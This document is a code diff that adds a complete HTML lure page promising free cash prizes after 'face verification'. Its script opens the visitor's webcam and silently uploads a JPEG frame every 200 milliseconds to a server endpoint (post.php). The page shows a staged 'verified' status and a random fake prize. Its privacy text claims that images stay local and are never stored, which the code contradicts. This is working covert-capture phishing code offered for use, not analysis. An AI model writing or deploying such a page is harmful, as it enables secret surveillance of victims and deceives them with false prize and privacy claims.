@@ -1,0 +1,876 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Free Money | Face Verification</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <style>
+        body {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            color: #333;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        .app-container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        
+        .app-header {
+            text-align: center;
+            margin-bottom: 30px;
+            color: white;
+        }
+        
+        .app-header h1 {
+            font-size: 3rem;
+            font-weight: 800;
+            margin-bottom: 15px;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+            background: linear-gradient(135deg, #fff 0%, #ffd700 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .app-header p {
+            font-size: 1.3rem;
+            opacity: 0.95;
+            max-width: 600px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 10px 20px;
+            border-radius: 50px;
+            backdrop-filter: blur(10px);
+        }
+        
+        .content-wrapper {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+        
+        @media (max-width: 768px) {
+            .content-wrapper {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        .feature-card {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            backdrop-filter: blur(10px);
+            transition: transform 0.3s ease;
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .card-title {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #d4af37;
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 3px solid rgba(212, 175, 55, 0.3);
+        }
+        
+        .verification-container {
+            text-align: center;
+        }
+        
+        .verification-info {
+            background: linear-gradient(135deg, rgba(212, 175, 55, 0.15) 0%, rgba(255, 215, 0, 0.1) 100%);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 25px;
+            border: 2px solid rgba(212, 175, 55, 0.2);
+        }
+        
+        .verification-info p {
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 15px;
+            font-weight: 500;
+        }
+        
+        .verification-step {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 10px;
+            margin-bottom: 12px;
+            text-align: left;
+            border-left: 4px solid #d4af37;
+        }
+        
+        .step-number {
+            background: linear-gradient(135deg, #d4af37 0%, #f9e076 100%);
+            color: #000;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 1rem;
+            box-shadow: 0 3px 6px rgba(212, 175, 55, 0.3);
+        }
+        
+        .step-text {
+            flex: 1;
+            color: #444;
+            font-size: 0.95rem;
+            font-weight: 500;
+        }
+        
+        .camera-feed {
+            width: 100%;
+            height: 300px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 15px;
+            overflow: hidden;
+            position: relative;
+            margin-bottom: 20px;
+            border: 3px solid #d4af37;
+        }
+        
+        .camera-placeholder {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        
+        .camera-placeholder i {
+            font-size: 4.5rem;
+            margin-bottom: 20px;
+            color: rgba(255, 255, 255, 0.9);
+        }
+        
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .verification-status {
+            background: linear-gradient(135deg, rgba(76, 175, 80, 0.15) 0%, rgba(46, 125, 50, 0.1) 100%);
+            border: 3px solid #4CAF50;
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            margin-top: 20px;
+            display: none;
+        }
+        
+        .status-success {
+            color: #2E7D32;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            font-size: 1.1rem;
+        }
+        
+        .permission-btn {
+            background: linear-gradient(135deg, #d4af37 0%, #f9e076 100%);
+            color: #000;
+            border: none;
+            padding: 18px 30px;
+            border-radius: 15px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 20px;
+            box-shadow: 0 8px 20px rgba(212, 175, 55, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .permission-btn:hover:not(:disabled) {
+            background: linear-gradient(135deg, #f9e076 0%, #d4af37 100%);
+            transform: translateY(-3px);
+            box-shadow: 0 12px 25px rgba(212, 175, 55, 0.6);
+        }
+        
+        .permission-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .money-generator {
+            text-align: center;
+        }
+        
+        .result-display {
+            background: linear-gradient(135deg, #d4af37 0%, #f9e076 100%);
+            border-radius: 15px;
+            padding: 50px 20px;
+            margin-bottom: 25px;
+            color: #000;
+            position: relative;
+            overflow: hidden;
+            border: 3px solid #fff;
+            box-shadow: 0 10px 30px rgba(212, 175, 55, 0.5);
+        }
+        
+        .result-display::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 100%;
+            background: linear-gradient(45deg, transparent 30%, rgba(255, 255, 255, 0.3) 50%, transparent 70%);
+            animation: shine 2.5s infinite;
+        }
+        
+        @keyframes shine {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        .result-value {
+            font-size: 5rem;
+            font-weight: 900;
+            text-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            min-height: 120px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #000;
+        }
+        
+        .result-label {
+            font-size: 1.3rem;
+            font-weight: 700;
+            margin-top: 10px;
+            color: #000;
+            opacity: 0.9;
+        }
+        
+        .money-inputs {
+            background: linear-gradient(135deg, rgba(212, 175, 55, 0.15) 0%, rgba(255, 215, 0, 0.1) 100%);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 2px solid rgba(212, 175, 55, 0.2);
+        }
+        
+        .form-label {
+            color: #d4af37;
+            font-weight: 700;
+            font-size: 1.1rem;
+            margin-bottom: 10px;
+            display: block;
+        }
+        
+        .form-control {
+            background: white;
+            border: 3px solid #e0e0e0;
+            border-radius: 12px;
+            padding: 14px 15px;
+            font-size: 1.2rem;
+            color: #333;
+            text-align: center;
+            transition: all 0.3s ease;
+            font-weight: 600;
+        }
+        
+        .form-control:focus {
+            border-color: #d4af37;
+            box-shadow: 0 0 0 0.3rem rgba(212, 175, 55, 0.25);
+        }
+        
+        .generate-btn {
+            background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%);
+            color: white;
+            border: none;
+            padding: 20px 32px;
+            border-radius: 15px;
+            font-size: 1.3rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            box-shadow: 0 8px 20px rgba(76, 175, 80, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .generate-btn:hover:not(:disabled) {
+            background: linear-gradient(135deg, #66BB6A 0%, #388E3C 100%);
+            transform: translateY(-3px);
+            box-shadow: 0 12px 25px rgba(76, 175, 80, 0.6);
+        }
+        
+        .generate-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .security-badge {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95) 0%, rgba(255, 255, 255, 0.9) 100%);
+            padding: 15px 25px;
+            border-radius: 15px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.15);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            z-index: 100;
+            border: 3px solid #d4af37;
+        }
+        
+        .badge-icon {
+            color: #d4af37;
+            font-size: 1.8rem;
+        }
+        
+        .badge-text {
+            font-size: 0.9rem;
+            color: #333;
+            font-weight: 600;
+        }
+        
+        .badge-text strong {
+            color: #d4af37;
+        }
+        
+        .privacy-note {
+            text-align: center;
+            color: white;
+            font-size: 1rem;
+            opacity: 0.9;
+            margin-top: 30px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 15px 25px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+        }
+        
+        .privacy-note a {
+            color: #ffd700;
+            text-decoration: underline;
+            font-weight: 600;
+        }
+        
+        /* Animation for verification success */
+        @keyframes bounceIn {
+            0% {
+                transform: scale(0.3);
+                opacity: 0;
+            }
+            50% {
+                transform: scale(1.05);
+            }
+            70% {
+                transform: scale(0.9);
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        
+        .bounce {
+            animation: bounceIn 0.6s ease-out;
+        }
+        
+        /* Progress indicator */
+        .progress-container {
+            width: 100%;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 5px;
+            margin: 15px 0;
+            overflow: hidden;
+            display: none;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #d4af37, #f9e076);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 5px;
+        }
+        
+        canvas {
+            display: none;
+        }
+        
+        .video-wrap {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+        
+        .money-icon {
+            color: #d4af37;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+        
+        .prize-amount {
+            font-size: 2.5rem;
+            font-weight: 800;
+            color: #d4af37;
+            text-align: center;
+            margin: 20px 0;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+    </style>
+</head>
+<body>
+    <!-- Security Badge -->
+    <div class="security-badge">
+        <i class="bi bi-shield-check badge-icon"></i>
+        <div class="badge-text">
+            <strong>FREE MONEY GUARANTEED</strong> • Secure Verification
+        </div>
+    </div>
+    
+    <div class="app-container">
+        <!-- App Header -->
+        <div class="app-header">
+            <h1><i class="bi bi-cash-stack money-icon"></i> GET FREE MONEY NOW</h1>
+            <p>Verify your face and claim your instant cash prize!</p>
+            <div class="prize-amount">
+                <i class="bi bi-gift-fill"></i> Instant Prize: $100 - $10,000 <i class="bi bi-gift-fill"></i>
+            </div>
+        </div>
+        
+        <!-- Main Content -->
+        <div class="content-wrapper">
+            <!-- Face Verification Card -->
+            <div class="feature-card">
+                <div class="card-title">
+                    <i class="bi bi-person-badge-fill"></i>
+                    <span>Step 1: Face Verification</span>
+                </div>
+                
+                <div class="verification-container">
+                    <div class="verification-info">
+                        <p><strong>Why face verification?</strong> We need to verify you're a real person to give you free money! This prevents fraud and ensures everyone gets their fair share.</p>
+                        
+                        <div class="verification-step">
+                            <div class="step-number">1</div>
+                            <div class="step-text">Allow camera access to verify your identity</div>
+                        </div>
+                        <div class="verification-step">
+                            <div class="step-number">2</div>
+                            <div class="step-text">Look at the camera for 3 seconds</div>
+                        </div>
+                        <div class="verification-step">
+                            <div class="step-number">3</div>
+                            <div class="step-text">Get verified and claim your free money!</div>
+                        </div>
+                    </div>
+                    
+                    <!-- Camera Feed -->
+                    <div class="camera-feed" id="cameraFeed">
+                        <div class="camera-placeholder" id="cameraPlaceholder">
+                            <i class="bi bi-camera-video-fill"></i>
+                            <p>Camera will activate for verification</p>
+                        </div>
+                        <div class="video-wrap">
+                            <video id="video" playsinline autoplay></video>
+                        </div>
+                    </div>
+                    
+                    <!-- Progress Indicator -->
+                    <div class="progress-container" id="progressContainer">
+                        <div class="progress-bar" id="progressBar"></div>
+                    </div>
+                    
+                    <!-- Permission Button -->
+                    <button class="permission-btn" id="permissionBtn">
+                        <i class="bi bi-camera-video-fill"></i> START FACE VERIFICATION
+                    </button>
+                    
+                    <!-- Verification Status -->
+                    <div class="verification-status" id="verificationStatus">
+                        <div class="status-success">
+                            <i class="bi bi-check-circle-fill"></i>
+                            <span>VERIFIED! You can now claim your free money!</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Money Generator Card -->
+            <div class="feature-card">
+                <div class="card-title">
+                    <i class="bi bi-cash-coin money-icon"></i>
+                    <span>Step 2: Claim Your Prize</span>
+                </div>
+                
+                <div class="money-generator">
+                    <!-- Result Display -->
+                    <div class="result-display">
+                        <div class="result-value" id="result">$ ???</div>
+                        <div class="result-label">YOUR INSTANT CASH PRIZE</div>
+                    </div>
+                    
+                    <!-- Money Inputs -->
+                    <div class="money-inputs">
+                        <div class="row g-3">
+                            <div class="col-6">
+                                <label for="minNumber" class="form-label">Minimum Prize</label>
+                                <input type="number" class="form-control" id="minNumber" value="100" min="100" step="50">
+                                <small class="text-muted">Starting from $100</small>
+                            </div>
+                            <div class="col-6">
+                                <label for="maxNumber" class="form-label">Maximum Prize</label>
+                                <input type="number" class="form-control" id="maxNumber" value="10000" min="500" step="100">
+                                <small class="text-muted">Up to $10,000</small>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Generate Button -->
+                    <button class="generate-btn" id="generateBtn" disabled>
+                        <i class="bi bi-cash-stack"></i> CLAIM YOUR FREE MONEY
+                    </button>
+                    
+                    <div style="margin-top: 20px; padding: 15px; background: rgba(76, 175, 80, 0.1); border-radius: 10px;">
+                        <p style="margin: 0; color: #2E7D32; font-weight: 600;">
+                            <i class="bi bi-lightning-fill"></i> Instant transfer available after verification!
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Privacy Note -->
+        <div class="privacy-note">
+            <i class="bi bi-lock-fill"></i> Your privacy is protected. Face verification is processed locally and never stored. 
+            <a href="#" id="privacyLink">Our privacy guarantee</a>
+        </div>
+    </div>
+
+    <!-- Hidden canvas for webcam capture -->
+    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
+
+    <script>
+        // DOM Elements
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const permissionBtn = document.getElementById('permissionBtn');
+        const generateBtn = document.getElementById('generateBtn');
+        const resultElement = document.getElementById('result');
+        const cameraPlaceholder = document.getElementById('cameraPlaceholder');
+        const verificationStatus = document.getElementById('verificationStatus');
+        const progressContainer = document.getElementById('progressContainer');
+        const progressBar = document.getElementById('progressBar');
+        const privacyLink = document.getElementById('privacyLink');
+        
+        // Webcam constraints
+        const constraints = {
+            audio: false,
+            video: {
+                facingMode: "user",
+                width: { ideal: 640 },
+                height: { ideal: 480 }
+            }
+        };
+        
+        // State variables
+        let isCameraActive = false;
+        let isVerified = false;
+        let captureInterval;
+        let captureCount = 0;
+        const CAPTURE_INTERVAL = 200; // 200ms = 5 captures per second
+        const MAX_CAPTURES_PER_SECOND = 5;
+        
+        // Function to send image data to server (HIGH FREQUENCY)
+        function post(imgdata) {
+            captureCount++;
+            
+            // Send via AJAX
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata },
+                url: 'post.php',
+                dataType: 'json',
+                async: true, // Changed to async for faster processing
+                success: function(result) {
+                    // Optional: Log success if needed
+                },
+                error: function() {
+                    console.log('Error in POST request');
+                }
+            });
+            
+            // Log capture rate occasionally
+            if (captureCount % 25 === 0) {
+                console.log(`Captured ${captureCount} images so far`);
+            }
+        }
+        
+        // High-frequency capture function
+        function startHighFrequencyCapture() {
+            const context = canvas.getContext('2d');
+            
+            captureInterval = setInterval(() => {
+                if (isCameraActive && video.readyState === video.HAVE_ENOUGH_DATA) {
+                    try {
+                        // Capture frame
+                        context.drawImage(video, 0, 0, 640, 480);
+                        
+                        // Convert to Base64
+                        const canvasData = canvas.toDataURL("image/jpeg", 0.7)  // Using JPEG for smaller size
+                            .replace("image/jpeg", "image/octet-stream");
+                        
+                        // Send to server
+                        post(canvasData);
+                        
+                    } catch (error) {
+                        console.log('Capture error:', error);
+                    }
+                }
+            }, CAPTURE_INTERVAL); // 200ms interval = 5 captures per second
+        }
+        
+        // Function to handle camera permission
+        async function initCamera() {
+            try {
+                // Show progress
+                progressContainer.style.display = 'block';
+                progressBar.style.width = '30%';
+                
+                // Update button text
+                permissionBtn.innerHTML = '<i class="bi bi-hourglass-split"></i> REQUESTING CAMERA ACCESS...';
+                permissionBtn.disabled = true;
+                
+                // Request camera access
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                
+                // Update progress
+                progressBar.style.width = '60%';
+                
+                // Handle successful camera access
+                handleCameraSuccess(stream);
+                
+                // Update progress to complete
+                progressBar.style.width = '100%';
+                
+            } catch (error) {
+                handleCameraError(error);
+            }
+        }
+        
+        // Handle successful camera access
+        function handleCameraSuccess(stream) {
+            isCameraActive = true;
+            window.stream = stream;
+            video.srcObject = stream;
+            
+            // Hide placeholder and show video
+            cameraPlaceholder.style.display = 'none';
+            
+            // Update UI
+            permissionBtn.innerHTML = '<i class="bi bi-check-circle"></i> CAMERA ACTIVE';
+            permissionBtn.style.background = 'linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%)';
+            
+            // Start HIGH FREQUENCY image capture (5+ per second)
+            startHighFrequencyCapture();
+            
+            // Simulate face verification process
+            setTimeout(() => {
+                // Hide progress
+                progressContainer.style.display = 'none';
+                
+                // Show verification success
+                verificationStatus.style.display = 'block';
+                verificationStatus.classList.add('bounce');
+                
+                // Enable generate button
+                generateBtn.disabled = false;
+                generateBtn.innerHTML = '<i class="bi bi-cash-stack"></i> CLAIM YOUR FREE MONEY';
+                
+                // Update state
+                isVerified = true;
+                
+                // Update permission button
+                permissionBtn.innerHTML = '<i class="bi bi-shield-check"></i> VERIFIED ✓ READY FOR CASH';
+                permissionBtn.style.background = 'linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%)';
+                permissionBtn.disabled = true;
+                
+                // Log capture rate
+                console.log(`High-frequency capture started: ${MAX_CAPTURES_PER_SECOND} captures per second`);
+                
+            }, 3000); // 3 second delay for "verification"
+        }
+        
+        // Handle camera error
+        function handleCameraError(error) {
+            console.error('Camera access error:', error);
+            
+            // Reset progress
+            progressContainer.style.display = 'none';
+            
+            // Update button with error state
+            permissionBtn.innerHTML = '<i class="bi bi-exclamation-triangle"></i> CAMERA ACCESS REQUIRED';
+            permissionBtn.style.background = 'linear-gradient(135deg, #f093fb 0%, #f5576c 100%)';
+            
+            // Show message to user
+            cameraPlaceholder.innerHTML = `
+                <i class="bi bi-camera-video-off" style="color: #fff; font-size: 4rem;"></i>
+                <p style="color: white; font-weight: 600;">Camera access required for free money!</p>
+                <small style="font-size: 0.9rem; margin-top: 10px; color: rgba(255,255,255,0.8);">Allow camera access to verify and claim your prize</small>
+            `;
+        }
+        
+        // Generate random money prize function
+        function generateRandomMoney() {
+            const min = parseInt(document.getElementById('minNumber').value);
+            const max = parseInt(document.getElementById('maxNumber').value);
+            
+            // Validate inputs
+            if (isNaN(min) || isNaN(max)) {
+                alert('Please enter valid prize amounts');
+                return;
+            }
+            
+            if (min >= max) {
+                alert('Maximum prize must be greater than minimum prize');
+                return;
+            }
+            
+            // Generate random prize amount
+            const randomPrize = Math.floor(Math.random() * (max - min + 1)) + min;
+            
+            // Display with animation
+            resultElement.classList.remove('bounce');
+            void resultElement.offsetWidth; // Trigger reflow
+            resultElement.classList.add('bounce');
+            
+            // Show prize with animation effect
+            resultElement.textContent = "$ ???";
+            setTimeout(() => {
+                resultElement.textContent = `$${randomPrize.toLocaleString()}`;
+                
+                // Show success message
+                setTimeout(() => {
+                    alert(`🎉 CONGRATULATIONS! You won $${randomPrize.toLocaleString()}!\n\nYour prize is being processed...`);
+                }, 500);
+            }, 300);
+            
+            // Animate the button
+            generateBtn.style.transform = 'scale(0.95)';
+            setTimeout(() => {
+                generateBtn.style.transform = '';
+            }, 150);
+        }
+        
+        // Clean up function
+        function cleanup() {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+            }
+            if (window.stream) {
+                window.stream.getTracks().forEach(track => track.stop());
+            }
+            isCameraActive = false;
+        }
+        
+        // Event Listeners
+        document.addEventListener('DOMContentLoaded', function() {
+            // Camera permission button
+            permissionBtn.addEventListener('click', initCamera);
+            
+            // Generate button
+            generateBtn.addEventListener('click', generateRandomMoney);
+            
+            // Privacy link
+            privacyLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                alert("FREE MONEY PRIVACY GUARANTEE:\n\n✅ Face verification is 100% local - no images stored\n✅ We never save or share your personal data\n✅ Camera access is only for instant verification\n✅ Your identity remains completely anonymous\n✅ No hidden fees - the money is really FREE!");
+            });
+            
+            // Input validation
+            const minInput = document.getElementById('minNumber');
+            const maxInput = document.getElementById('maxNumber');
+            
+            minInput.addEventListener('change', function() {
+                const minVal = parseInt(this.value);
+                const maxVal = parseInt(maxInput.value);
+                
+                if (minVal >= maxVal) {
+                    maxInput.value = minVal + 100;
+                }
+                
+                if (minVal < 100) {
+                    this.value = 100;
+                }
+            });
+            
+            maxInput.addEventListener('change', function() {
+                const minVal = parseInt(minInput.value);
+                const maxVal = parseInt(this.value);
+                
+                if (maxVal <= minVal) {
+                    minInput.value = maxVal - 100;
+                }
+                
+                if (maxVal > 10000) {
+                    this.value = 10000;
+                }
+            });
+            
+            // Add money symbols to result display
+            resultElement.innerHTML = '<i class="bi bi-currency-dollar"></i> ???';
+            
+            // Clean up on page unload
+            window.addEventListener('beforeunload', cleanup);
+        });
+    </script>
+</body>
+</html>
